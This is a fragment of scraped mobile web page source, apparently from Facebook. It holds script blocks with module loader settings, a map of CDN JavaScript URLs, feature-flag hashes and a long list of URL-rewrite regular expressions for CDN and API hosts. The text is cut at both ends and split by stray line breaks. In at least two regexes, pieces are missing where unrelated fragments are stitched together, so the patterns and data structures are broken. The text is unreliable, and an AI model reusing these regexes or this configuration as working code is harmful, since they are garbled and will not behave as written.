oan\/learnmore\/":1,"\/upsell\/purchase\/":1,"\/upsell\/promos\/upgrade\/":1,"\/upsell\/buy_redirect\/":1,"\/upsell\/loan\/buyconfirm\/":1,"\/upsell\/loan\/buy\/":1,"\/upsell\/sms\/":1,"\/wap\/a\/channel\/reconnect.php":1,"\/wap\/a\/nux\/wizard\/nav.php":1,"\/wap\/appreg.php":1,"\/wap\/birthday_help.php":1,"\/wap\/c.php":1,"\/wap\/confirmemail.php":1,"\/wap\/cr.php":1,"\/wap\/login.php":1,"\/wap\/r.php":1,"\/zero\/datapolicy":1,"\/a\/timezone.php":1,"\/a\/bz":1,"\/bz\/reliability":1,"\/r.php":1,"\/mr\/":1,"\/reg\/":1,"\/registration\/log\/":1,"\/terms\/":1,"\/f123\/":1,"\/expert\/":1,"\/experts\/":1,"\/terms\/index.php":1,"\/terms.php":1,"\/srr\/":1,"\/msite\/redirect\/":1,"\/fbs\/pixel\/":1,"\/contactpoint\/preconfirmation\/":1,"\/contactpoint\/cliff\/":1,"\/contactpoint\/confirm\/submit\/":1,"\/contactpoint\/confirmed\/":1,"\/contactpoint\/login\/":1,"\/preconfirmation\/contactpoint_change\/":1,"\/help\/contact\/":1,"\/survey\/":1,"\/upsell\/loyaltytopup\/accept\/":1,"\/settings\/":1}},1478],["ZeroCategoryHeader",[],{},1127],["MSession",[],{"useAngora":false,"logoutURL":"\/logout.php?h=Afc2QCeSKa3e5rnG&t=1562746288","push_phase":"C3"},52]]);new (require("ServerJS"))().handle({"require":[["MPrelude"],["BanzaiODS"],["VisualCompletionGating"],["BanzaiScuba"]]});}, "ServerJS define", {"root":true})();</script>
<script>var bigPipe = new (require("BigPipe"))({"forceFinish":true,"config":{"flush_pagelets_asap":true,"handle_
defines_asap":true,"handle_instances_asap":true,"dispatch_pagelet_replayable_actions":false}});</script>
<script>bigPipe.beforePageletArrive("first_response")</script>

<script>require("TimeSlice").guard((function(conteinar){bigPipe.onPageletArrive({bootloadable:{BanzaiODS:{r:["7WaeZ","7h70N",
"WeCkj","2kgCM"],rds:{m:["BanzaiODS","BanzaiScuba"]}},VisualCompletionGating:{r:["E/TfP"]},BanzaiScuba:{r:["7WaeZ",
"7h70N","WeCkj","2kgCM"],rds:{m:["BanzaiODS","BanzaiScuba"]}},GeneratedPackerUtils:{r:["uYbVb","qlimw"]},SnappyCompre
ssUtil:{r:["7h70N"]},GeneratedArtilleryUserTimingSink:{r:["uYbVb","9Zaf3","sGe+Z","Hx+az"],rds:{m:["BanzaiODS","Banzai
Scuba"],r:["7WaeZ","7h70N","WeCkj","2kgCM"]}},MqttLongPollingRunner:{r:["bvPDY","WeCkj"]},Banzai:{r:["7WaeZ","7h70N","
WeCkj","2kgCM"],rds:{m:["BanzaiODS","BanzaiScuba"]}},BanzaiStream:{r:["7WaeZ","7h70N","ZU1ro","WeCkj","2kgCM"],rds:{m:["B
anzaiODS","BanzaiScuba"]}},ResourceTimingBootloaderHelper:{r:["nZzfG","7h70N"],rds:{m:["BanzaiODS","VisualCompletionGating","
BanzaiScuba"],r:["7WaeZ","E/TfP","WeCkj","2kgCM"]}},TimeSliceHelper:{r:["yo/Ha"]},PerfXSharedFields:{r:["7h70N"]},TimeSliceInt
eractionsLiteTypedLogger:{r:["7WaeZ","7h70N","FHtgt","WeCkj","2kgCM"],rds:{m:["BanzaiODS","BanzaiScuba"]}},WebSpeedInteractionsT
ypedLogger:{r:["7WaeZ","7h70N","4LL/S","WeCkj","2kgCM"],rds:{m:["BanzaiODS","BanzaiScuba"]}}},resource_map:{uYbVb:{type:"js",src:
"https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yO/r/yncgZiC7BC6.js",crossOrigin:1},qlimw:{type:"js",src:
"https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yy/r/47FQKfQw4C3.js",crossOrigin:1},"9Zaf3":{type:"js",src:
"https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yA/r/dQ_TzJobF0o.js",crossOrigin:1},"sGe+Z":{type:"js",src:"
https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yw/r/uXgWi_zhSQG.js",crossOrigin:1},"Hx+az":{type:"js",src:"
https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yf/r/zO5MojAgN8I.js",crossOrigin:1},RvGQk:{type:"js",src:"
https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yW/r/3KrZRHvCiNB.js",crossOrigin:1},bvPDY:{type:"js",src:"
https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yx/r/eKsfGAftYeL.js",crossOrigin:1},"rIT/7":{type:"js",src:"
https://z-m-static.xx.fbcdn.net/rsrc.php/v3i3kA4/ya/l/en_GB/WDQCA1m92nx.js",crossOrigin:1},o7DZV:{type:"
js",src:"https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yb/r/rTHJvFym-mu.js",crossOrigin:1},"1PshU":{type:"j
s",src:"https://z-m-static.xx.fbcdn.net/rsrc.php/v3ig7n4/y1/l/en_GB/q4ynzKxD5Cd.js",crossOrigin:1},YohY1:
{type:"js",src:"https://z-m-static.xx.fbcdn.net/rsrc.php/v3/y1/r/aVlTN5yPneM.js",crossOrigin:1},"uHwK+":{
type:"js",src:"https://z-m-static.xx.fbcdn.net/rsrc.php/v3izp84/yM/l/en_GB/3ZZmKyhKzV5.js",crossOrigin:1}
,nZzfG:{type:"js",src:"https://z-m-static.xx.fbcdn.net/rsrc.php/v3/y9/r/e44zKIyPpjW.js",crossOrigin:1},"2h
SNO":{type:"js",src:"https://z-m-static.xx.fbcdn.net/rsrc.php/v3ilqt4/yZ/l/en_GB/JW4bPtoiZOB.js",crossOrigi
n:1},ZU1ro:{type:"js",src:"https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yU/r/QKWIqWeZBgJ.js",crossOrigin:1},
"yo/Ha":{type:"js",src:"https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yI/r/5sRLGzXi6Gy.js",crossOrigin:1},
FHtgt:{type:"js",src:"https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yN/r/3cdJiqLWPaS.js",crossOrigin:1},"
4LL/S":{type:"js",src:"https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yj/r/mJOToILUO1g.js",crossOrigin:1}},g
kxData:{"990605":{result:true,hash:"AT40lh9-HK-SGE4B"},"919652":{result:false,hash:"AT4_gzSP9OrUf8y5"},"83
2242":{result:false,hash:"AT43SiDH0pyOWjQc"},"678651":{result:true,hash:"AT5Kxbf69XYw4_V_"},"865725":{resu
lt:true,hash:"AT5_jEZYlaAzqX2l"},"865724":{result:false,hash:"AT4AwfGH31wT9IFv"},"919316":{result:true,has
h:"AT6bv79JQswK913b"},"901339":{result:true,hash:"AT5YU58tbRv5QkFh"},"807517":{result:true,hash:"AT703FI3q
9jxT5Rw"},"945829":{result:false,hash:"AT6ju8BguCDYmr3m"},"778292":{result:false,hash:"AT7mxKw9FjlLjKXf"},
"676936":{result:false,hash:"AT45mxP6W8rIplsO"},"987139":{result:false,hash:"AT7x7bO9h26fsuC8"},"955621":{
result:true,hash:"AT55A0fLhnZsO1vY"},"942685":{result:false,hash:"AT5S-fx2mBFEaQ-E"},"676940":{result:fals
e,hash:"AT7d4SO6ISXIJ72A"},"712819":{result:false,hash:"AT7s-rpJLWe8sq_N"},"676781":{result:false,hash:"AT
4tsxeay9SWUgpy"},"910664":{result:false,hash:"AT7pPdELr2YCpirM"},"676826":{result:false,hash:"AT4g0O2w4XS9
1sJv"},"862436":{result:false,hash:"AT6JROrGw1Pd_8H2"},"692841":{result:false,hash:"AT7Nc0FxpbCVU531"},"820050":{
result:true,hash:"AT7VyJ262DHcg3YU"},"676812":{result:false,hash:"AT5LFnGEVMPBQtj7"},"676811":{result:false,hash:
"AT75Y3NPvweqVEeT"},"726410":{result:true,hash:"AT6rFQjJoso5LfF0"},"849406":{result:false,hash:"AT5xC79G9xps1Gd6"
}},qexData:{"816772":{r:null},"805072":{r:null},"833102":{r:null}},allResources:["f6z13","7WaeZ","WeCkj","RvGQk",
"bvPDY","AuqKi","rIT/7","o7DZV","7h70N","1PshU","YohY1","uHwK+","E/TfP","2kgCM","nZzfG","2hSNO"],displayResources:["f6z13",
"7WaeZ","WeCkj","AuqKi","7h70N","YohY1","E/TfP","2kgCM","nZzfG","2hSNO"],id:"first_response",phase:0,jsmods:{elements:[["
","u_0_1",1],["__elem_e03291d5_0_1","u_0_2",1],["__elem_e03291d5_0_0","u_0_3",1],["__elem_7216e2ae_0_0","u_0_4",1],["__elem_b
e66b106_0_0","u_0_5",1],["__elem_7216e2ae_0_1","u_0_6",1],["__elem_e980dec4_0_0","signup-button",1],["__elem_49f6b607_0_0","r
oot",1],["__elem_eed16c0a_0_0","u_0_7",1],["__elem_a588f507_0_0","u_0_8",1],["__elem_a588f507_0_1","u_0_9",1],["__elem_0cdc66
ad_0_0","u_0_b",1],["__elem_0cdc66ad_0_1","u_0_c",1]],require:[["MobileZeroRewriteURL","main",[],[{regex_matcher:["^(https?):

//(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)((?:fdac4-1|fdac68-1|fsdu1-1|fsjc1-3)\\.fna)(\\.fbcdn\\.net(:?[0-9]{0,5}))(/
.*(\\.mp4|\\.hls|\\.flv)(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)","^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\
\.)((?:fdac4-1|fdac68-1|fsdu1-1|fsjc1-3)\\.fna)(\\.fbcdn\\.net(:?[0-9]{0,5}))(/.*(\\.mp4|\\.hls|\\.flv)(\\?.*)?$)","^(https?)
://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)((?:fdac4-1|fdac68-1|fsdu1-1|fsjc1-3)\\.fna)(\\.fbcdn\\.net)(:?[0-9]{0,5})(
.*(?:t[0-9]+\\.(?:1997)-6($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)))","^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-
9a-zA-Z\\.-]+\\.)((?:fdac4-1|fdac68-1|fsdu1-1|fsjc1-3)\\.fna)(\\.fbcdn\\.net)(:?[0-9]{0,5})(.*(?:t[0-9]+\\.(?:9024)-6($|(?:/.
*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)))","^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)((?:fdac4-1|fdac
68-1|fsdu1-1|fsjc1-3)\\.fna)(\\.fbcdn\\.net)(:?[0-9]{0,5})(.*(?:t[0-9]+\\.(?:10537|11485)-6($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*
$)(?=.*oh=.*$).*)$)))","^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)((?:fdac4-1|fdac68-1|fsdu1-1|fsjc1-3)\\.fn
a)(\\.fbcdn\\.net)(:?[0-9]{0,5})(.*(?:t[0-9]+\\.(?:8221)-6($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)))","^(https?)
://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)((?:fdac4-1|fdac68-1|fsdu1-1|fsjc1-3)\\.fna)(\\.fbcdn\\.net)(:?[0-9]{0,5})(
.*(?:t[0-9]+\\.(?:1997)-6($|\\?.*$|/.*$)))","^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)((?:fdac4-1|fdac68-1|
fsdu1-1|fsjc1-3)\\.fna)(\\.fbcdn\\.net)(:?[0-9]{0,5})(.*(?:t[0-9]+\\.(?:9024)-6($|\\?.*$|/.*$)))","^(https?)://(?:z-1-|z-m-|z
-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)((?:fdac4-1|fdac68-1|fsdu1-1|fsjc1-3)\\.fna)(\\.fbcdn\\.net)(:?[0-9]{0,5})(.*(?:t[0-9
-3)\\.fna)(\\.fbcdn\\.net)(:?[0-9]{0,5})(.*(?:t[0-9]+\\.(?:8221)-6($|\\?.*$|/.*$)))","^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?(
[0-9a-zA-Z\\.-]+\\.)((?:fdac4-1|fdac68-1|fsdu1-1|fsjc1-3)\\.fna)(\\.fbcdn\\.net(:?[0-9]{0,5}))($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-
m.*$)(?=.*oh=.*$).*)$)","^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)((?:fdac4-1|fdac68-1|fsdu1-1|fsjc1-3)\\.f
na)(\\.fbcdn\\.net(:?[0-9]{0,5}))($|\\?.*$|/.*$)","^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)(f\\w+-\\w+\\.f
na)(\\.fbcdn\\.net(:?[0-9]{0,5}))(/.*(\\.mp4|\\.hls|\\.flv)(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)","^(https?)://(?:z-1-|z
-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)(f\\w+-\\w+\\.fna)(\\.fbcdn\\.net(:?[0-9]{0,5}))(/.*(\\.mp4|\\.hls|\\.flv)(\\?.*)?$)","

^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)(f\\w+-\\w+\\.fna)(\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?
:1997)-6($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)))","^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z
https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)(f\\w+-\\w+\\.fna)(\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:1
0537|11485)-6($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)))","^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]
+\\.)(f\\w+-\\w+\\.fna)(\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:8221)-6($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*
$).*)$)))","^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)(f\\w+-\\w+\\.fna)(\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:
t[0-9]+\\.(?:1997)-6($|\\?.*$|/.*$)))","^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)(f\\w+-\\w+\\.fna)(\\.fbcd
n\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:9024)-6($|\\?.*$|/.*$)))","^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\
.)(f\\w+-\\w+\\.fna)(\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:10537|11485)-6($|\\?.*$|/.*$)))","^(https?)://(?:z-1-|z-
m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)(f\\w+-\\w+\\.fna)(\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:8221)-6($|\\?.*$|/.*$
)))","^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)(f\\w+-\\w+\\.fna)(\\.fbcdn\\.net(:?[0-9]{0,5}))($|(?:/.*)?(
?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)","^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)(f\\w+-\\w+\\.fna)(\\.fbcdn\\
.net(:?[0-9]{0,5}))($|\\?.*$|/.*$)","^(https?)://(api|api2|z-m-api|api-read|z-p3-api|z-p4-api|b-api)\\.([0-9a-zA-Z\\.-]*)?facebook\\
.com(:?[0-9]{0,5})((?:/method/user\\.registerPushCallback|/method/user\\.confirmContactpointPreconfirmation|/method/xconfig\\.fetch|
/method/mobile\\.gatekeepers|/method/user\\.unregisterPushCallback|/method/notifications\\.get|/me/notification_seen_states|/method/
auth\\.expireSession|/method/auth\\.login|/method/bookmarks\\.get|/me/messenger_only_account_migrations|/method/mobile\\.zeroHeaderR
equest|/method/user\\.sendMessengerOnlyPhoneConfirmationCode|/method/user\\.confirmMessengerOnlyPhone|/method/user\\.createMessenger
OnlyAccount|/method/user\\.bypassLoginWithConfirmedMessengerCredentials|/method/user\\.prefillorautocompletecontactpoint|/method/use
r\\.validateregistrationdata|/method/user\\.register)(?:$|\\?.*$|/.*$))","^(https?)://(?:z-p3-|z-p4-)?(rupload)\\.(?:p\\.|z\\.)?([0-
9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})((?:/fb_video|/messenger_video|/messenger_videos)(?:$|\\?.*$|/.*$))","^(https?)://(?:z-p3
-|z-p4-)?(rupload)\\.(?:p\\.|z\\.)?([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})(/messenger_image(?:$|\\?.*$|/.*$))","^(https?)://
(?:z-p3-|z-p4-)?(rupload)\\.(?:p\\.|z\\.)?([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})(/messenger_gif(?:$|\\?.*$|/.*$))","^(https
?)://(?:z-p3-|z-p4-)?(rupload)\\.(?:p\\.|z\\.)?([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})(/messenger_audio(?:$|\\?.*$|/.*$))","
^(https?)://(?:z-p3-|z-p4-)?(rupload)\\.(?:p\\.|z\\.)?([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})(/messenger_file(?:$|\\?.*$|/.*
$))","^(https?)://(?:z-p3-|z-p4-)?(rupload)\\.(?:p\\.|z\\.)?([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})($|\\?.*$|/.*$)","^(https
?)://(\\w+)\\.(p|z)\\.([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})($|\\?.*$|/.*$)","^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA
-Z\\.-]+)(?:-[0-9a-zA-Z]+-sonar)?(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(/.*(\\.mp4|\\.hls|\\.flv)(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).
*)$)","^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(?:-[0-9a-zA-Z]+-sonar)?(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(/.*(\\.mp4|
\\.hls|\\.flv)(\\?.*)?$)","^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(?:-[0-9a-zA-Z]+-sonar)?(\\.xx\\.fbcdn\\.net(:?[0-9
]{0,5}))(.*(?:t[0-9]+\\.(?:1997)-6($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)))","^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-
9a-zA-Z\\.-]+)(?:-[0-9a-zA-Z]+-sonar)?(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:9024)-6($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.
*$)(?=.*oh=.*$).*)$)))","^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(?:-[0-9a-zA-Z]+-sonar)?(\\.xx\\.fbcdn\\.net(:?[0-9]{
0,5}))(.*(?:t[0-9]+\\.(?:10537|11485)-6($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)))","^(https?)://(z-1-|z-m-|z-p3-|z-p4-|
)([0-9a-zA-Z\\.-]+)(?:-[0-9a-zA-Z]+-sonar)?(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:8221)-6($|(?:/.*)?(?:\\?(?!.*_nc_ad
=z-m.*$)(?=.*oh=.*$).*)$)))","^(https?)://(z-m-|z-1-|z-p3-|z-p4-)?(cdn|attachment|lookaside)\\.fbsbx\\.com(:?[0-9]{0,5})(/v/(?:t[0-9
]+\\.(?:15702|14050|14309|15989|22461)-21($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)))","^(https?)://(z-1-|z-m-|z-p3-|z-p4
-|)([0-9a-zA-Z\\.-]+)(?:-[0-9a-zA-Z]+-sonar)?(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$
)","^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(?:-[0-9a-zA-Z]+-sonar)?(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\
.(?:1997)-6($|\\?.*$|/.*$)))","^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(?:-[0-9a-zA-Z]+-sonar)?(\\.xx\\.fbcdn\\.net(:?
[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:9024)-6($|\\?.*$|/.*$)))","^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(?:-[0-9a-zA-Z]+-sonar)?
(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:10537|11485)-6($|\\?.*$|/.*$)))","^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\
.
-]+)(?:-[0-9a-zA-Z]+-sonar)?(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:8221)-6($|\\?.*$|/.*$)))","^(https?)://(z-m-|z-1-|z-p3-|z
-p4-)?(cdn|attachment|lookaside)\\.fbsbx\\.com(:?[0-9]{0,5})(/v/(?:t[0-9]+\\.(?:15702|14050|14309|15989|22461)-21($|\\?.*$|/.*$)))","^(http

s?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(?:-[0-9a-zA-Z]+-sonar)?(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*)(\\/t[0-9\\.]+-(?:0|8|9|10|12
))($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)","^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(?:-[0-9a-zA-Z]+-sonar)?(\\.
xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*)(\\/t[0-9\\.]+-(?:0|8|9|10|12))(/.*\\?.*$)","^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(?:-[0
-9a-zA-Z]+-sonar)?(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*)(\\/t[0-9\\.]+-(?:0|8|9|10|12))([^\\?]*$)","^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0
-9a-zA-Z\\.-]+)(?:-[0-9a-zA-Z]+-sonar)?(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*)(\\/t[0-9\\.]+-(?:1))($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*
oh=.*$).*)$)","^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(?:-[0-9a-zA-Z]+-sonar)?(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*)(\\/t[0-
9\\.]+-(?:1))(/.*\\?.*$)","^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(?:-[0-9a-zA-Z]+-sonar)?(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))
(.*)(\\/t[0-9\\.]+-(?:1))([^\\?]*$)","^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(?:-[0-9a-zA-Z]+-sonar)?(\\.xx\\.fbcdn\\.net(:?[0-
9]{0,5}))(.*)(\\/t[0-9\\.]+-(?:2|26|27|28|29))($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)","^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-
9a-zA-Z\\.-]+)(?:-[0-9a-zA-Z]+-sonar)?(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*)(\\/t[0-9\\.]+-(?:2|26|27|28|29))(/.*\\?.*$)","^(https?)://(z-1-|
z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(?:-[0-9a-zA-Z]+-sonar)?(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*)(\\/t[0-9\\.]+-(?:2|26|27|28|29))([^\\?]*$)
","^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(?:-[0-9a-zA-Z]+-sonar)?(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*)(\\/t[0-9\\.]+-(?:4))(
$|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)","^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(?:-[0-9a-zA-Z]+-sonar)?(\\.xx\\.
fbcdn\\.net(:?[0-9]{0,5}))(.*)(\\/t[0-9\\.]+-(?:4))(/.*\\?.*$)","^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(?:-[0-9a-zA-Z]+-sonar)
?(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*)(\\/t[0-9\\.]+-(?:4))([^\\?]*$)","^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(?:-[0-9a-zA-Z
]+-sonar)?(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*)(\\/t[0-9\\.]+-(?:6))($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)","^(https?)://(z-1
-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(?:-[0-9a-zA-Z]+-sonar)?(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*)(\\/t[0-9\\.]+-(?:6))(/.*\\?.*$)","^(https?
)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(?:-[0-9a-zA-Z]+-sonar)?(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*)(\\/t[0-9\\.]+-(?:6))([^\\?]*$)","^
(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(?:-[0-9a-zA-Z]+-sonar)?(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*)(\\/t[0-9\\.]+-(?:21))($|(?:
/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)","^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(?:-[0-9a-zA-Z]+-sonar)?(\\.xx\\.fbcdn\\
.net(:?[0-9]{0,5}))(.*)(\\/t[0-9\\.]+-(?:21))(/.*\\?.*$)","^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(?:-[0-9a-zA-Z]+-sonar)?(\\.xx\
\.fbcdn\\.net(:?[0-9]{0,5}))(.*)(\\/t[0-9\\.]+-(?:21))([^\\?]*$)","^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(?:-[0-9a-zA-Z]+-sonar)
?(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))($|\\?.*$|/.*$)","^(https?)://(api|api2|z-m-api|api-read|z-p3-api|z-p4-api)\\.([0-9a-zA-Z\\.-]*)?facebook\\.
com(:?[0-9]{0,5})($|\\?.*$|/.*$)","^(https?)://(graph|graph2|z-m-graph|z-p3-graph|z-p4-graph)\\.([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})(
/me/message_audios(?:$|\\?.*$|/.*$))","^(https?)://(graph|graph2|z-m-graph|z-p3-graph|z-p4-graph)\\.([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,
5})(/messagevideoattachment(?:$|\\?.*$|/.*$))","^(https?)://(graph|graph2|z-m-graph|z-p3-graph|z-p4-graph)\\.([0-9a-zA-Z\\.-]*)?facebook\\.com(:
?[0-9]{0,5})((?://me/chunked_upload_sessions|//[0-9]+/chunks|/v2\\.3/[0-9]+/videos)(?:$|\\?.*$|/.*$))","^(https?)://(graph|graph2|z-m-graph|z-p3
-graph|z-p4-graph)\\.([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})(/me/message_images(?:$|\\?.*$|/.*$))","^(https?)://(graph|graph2|z-m-graph|
